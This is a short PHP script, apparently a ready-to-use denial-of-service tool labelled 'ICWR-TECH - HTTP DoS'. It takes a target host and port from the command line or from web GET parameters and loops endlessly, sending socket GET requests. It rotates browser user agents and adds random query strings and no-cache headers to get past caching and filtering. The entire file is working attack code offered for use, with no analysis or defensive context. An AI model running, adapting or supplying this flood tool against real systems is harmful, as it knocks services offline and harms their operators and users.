<?php
error_reporting(0);
# ICWR-TECH - HTTP DoS
# By Afrizal F.A
class dos {

    function user_agent(){
        $arr=array("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36");
        return $arr[rand(0,count($arr)-1)];
    }

    function header($host,$user_agent,$point){
        $str="GET /$point\r\n";
        $str.="Host: $host\r\n";
        $str.="Pragma: no-cache\r\n";
        $str.="Cache-Control: no-cache\r\n";
        $str.="Accept-Encoding: gzip,deflate\r\n";
        $str.="User-Agent: ".$user_agent."\r\n";
        $str.="Accept-language: en-US,en,q=0.5\r\n";
        $str.="X-a: ".rand(0000000,9999999)."\r\n";
        $str.="Connection: Keep-Alive\r\n";
        $str.="Accept: */*\r\n\r\n";
        return $str;
    }

}

if($argv[1] && $argv[2]){

    $host=$argv[1];
    $port=$argv[2];

}elseif($_GET){

    $host=$_GET['host'];
    $port=$_GET['port'];

}else{
    echo "[-] Not Valid Option";
}

if(!empty($host && $port)){
 
    $dos=new dos;
    while(true) {
        if($argv[3]){
            $point=$argv[3];
        }elseif($_GET['point']){
            $point=$_GET['point'];
        }else{
            $point="?".rand(0000000,9999999)." HTTP/1.1";
        }
        $user_agent=$dos->user_agent();
        $s=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $req=socket_connect($s,$host,$port);
        $msg="[+] Attacking Host -> $host | Port -> $port | User-Agent -> $user_agent";
        if(socket_write($s,$dos->header($host,$user_agent,$point),strlen($dos->header($host,$user_agent,$point)))){
            if($_GET){
                echo "$msg<br>";
            }elseif($argv){
                echo "$msg\n";
            }else{
                echo "[-] Network Error.....";
            }
        }
        socket_close($s);
    }

}

?>
